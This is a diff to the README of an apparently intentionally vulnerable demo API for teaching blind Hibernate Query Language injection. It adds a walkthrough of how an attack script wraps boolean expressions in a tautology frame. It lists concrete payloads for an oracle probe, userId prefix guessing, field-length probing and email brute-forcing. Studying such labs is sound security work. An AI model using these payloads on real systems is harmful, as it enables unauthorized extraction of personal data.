@@ -12,20 +12,11 @@ This project demonstrates a REST API vulnerable to Hibernate Query Language (HQL
 
 1. **Clone the repository** (if not already done):
    ```powershell
-   git clone <repo-url>
+   git clone git@github.com:pdstat/hqli.git
    cd hqli
    ```
 
-2. **Build the project:**
-   ```powershell
-   ./mvnw clean package
-   ```
-   Or, on Windows:
-   ```powershell
-   .\mvnw.cmd clean package
-   ```
-
-3. **Run the API:**
+2. **Run the API:**
    ```powershell
    ./mvnw spring-boot:run
    ```
@@ -56,6 +47,53 @@ Long count = em.createQuery(hql, Long.class).getSingleResult();
    - If HQL breaks (syntax error), the exception text is returned in `message` with status `"401"`.
 
 This behavior creates a boolean oracle suitable for blind HQLi: the attacker can craft expressions so the query returns rows when the guessed condition is true and none when false.
+
+### How the script builds payloads and what HQL executes
+
+The Python script wraps boolean expressions in a tautology/falsity frame:
+
+- Wrapper: `0' or (<EXPR>) or '1'='2`
+- Exists helper: `exists ( from <Entity> u where <COND> )`
+
+Given the repository query template:
+
+```
+select count(*) from com.pdstat.hqli.entity.User1 usr
+where usr.userId = '%s' or usr.altUserId = '%s'
+```
+
+When the script sends an `agentCode` like `0' or (exists ( from com.pdstat.hqli.entity.User1 u where 1=1 )) or '1'='2`, the final HQL becomes:
+
+```
+select count(*) from com.pdstat.hqli.entity.User1 usr
+where usr.userId = '0' or (exists ( from com.pdstat.hqli.entity.User1 u where 1=1 )) or '1'='2'
+    or usr.altUserId = '0' or (exists ( from com.pdstat.hqli.entity.User1 u where 1=1 )) or '1'='2'
+```
+
+Below are representative payloads per phase (shown pre-URL-encoding; the client encodes automatically):
+
+- Oracle probe (false):
+   - Payload: `0' or (exists ( from com.pdstat.hqli.entity.User1 u where 1=0 )) or '1'='2`
+   - Effect: no matches -> JSON statusCode `"401"`.
+
+- Oracle probe (true):
+   - Payload: `0' or (exists ( from com.pdstat.hqli.entity.User1 u where 1=1 )) or '1'='2`
+   - Effect: matches -> JSON statusCode `"400"` with "Agent Already Registered".
+
+- Phase 1: userId prefix guess (e.g., does any `userId` start with `60`?)
+   - Payload: `0' or (exists ( from com.pdstat.hqli.entity.User1 u where u.userId like '60%' )) or '1'='2`
+   - Final HQL inlines this payload twice (for both `userId` and `altUserId`) as shown above; any row starting with 60 yields `"400"`.
+
+- Phase 2: field presence for a specific user (is `emailId` present for `60002650`?)
+   - Payload: `0' or (exists ( from com.pdstat.hqli.entity.User1 u where u.userId = '60002650' and u.emailId is not null )) or '1'='2`
+
+- Phase 2: field length lower bound (is `length(emailId) >= 5`?)
+   - Payload: `0' or (exists ( from com.pdstat.hqli.entity.User1 u where u.userId = '60002650' and u.emailId is not null and length(u.emailId) >= 5 )) or '1'='2`
+
+- Phase 3: field value prefix brute-force (does `emailId` start with `jo`?)
+   - Payload: `0' or (exists ( from com.pdstat.hqli.entity.User1 u where u.userId = '60002650' and u.emailId like 'jo%' )) or '1'='2`
+
+Note: The script safely doubles embedded quotes in guessed strings when needed (SQL-style `'` -> `''`), then the HTTP client URL-encodes the parameter.
 
 ## Sample requests to /checkvalidagent
 
